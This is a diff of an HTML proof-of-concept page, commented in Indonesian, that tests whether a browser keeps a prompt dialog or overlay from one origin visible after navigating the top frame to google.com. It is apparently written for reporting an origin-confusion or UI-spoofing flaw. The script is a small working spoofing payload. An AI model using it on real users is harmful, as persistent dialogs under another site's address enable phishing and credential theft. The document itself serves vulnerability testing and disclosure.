@@ -1,45 +1,31 @@
 <!doctype html>
 <html>
 <body>
-<h3>Attacker Origin Page</h3>
-<p>This page will navigate and keep its UI visible.</p>
+<h3>Prompt Persistence Test</h3>
 
 <script>
-function runPoC() {
-  // overlay UI dari origin awal
-  const overlay = document.createElement('div');
-  overlay.id = 'origin-overlay';
-  overlay.style = `
-    position:fixed;
-    top:0; left:0;
-    width:100%; height:100%;
-    background:rgba(0,0,0,0.85);
-    color:#fff;
-    z-index:999999;
-    font-size:18px;
-    padding:20px;
-  `;
-  overlay.innerHTML = `
-    <h2>Persistent UI Test</h2>
-    <p><b>UI Origin:</b> ${location.origin}</p>
-    <p><b>Created at:</b> ${new Date().toISOString()}</p>
-    <p>
-      This UI should disappear after navigation.<br>
-      If you still see this while the address bar shows another domain,
-      this indicates origin confusion.
-    </p>
-  `;
-  document.body.appendChild(overlay);
+function poc() {
+  const origin = location.origin;
+  const time = new Date().toISOString();
 
-  // delay lalu navigasi top-level
+  // trigger navigasi top-level
+  window.open('https://www.google.com', '_top');
+
+  // delay singkat lalu tampilkan prompt
   setTimeout(() => {
-    window.open('https://www.google.com', '_top');
-  }, 1500);
+    prompt(
+      'Persistent Dialog Test\n\n' +
+      'UI Origin: ' + origin + '\n' +
+      'Created at: ' + time + '\n\n' +
+      'If this dialog is visible while the address bar shows another domain,\n' +
+      'this indicates UI persistence across navigation.',
+      ''
+    );
+  }, 100);
 }
 
-setTimeout(runPoC, 1000);
+// delay awal agar jelas sequencing-nya
+setTimeout(poc, 1500);
 </script>
 </body>
 </html>
-
-/>
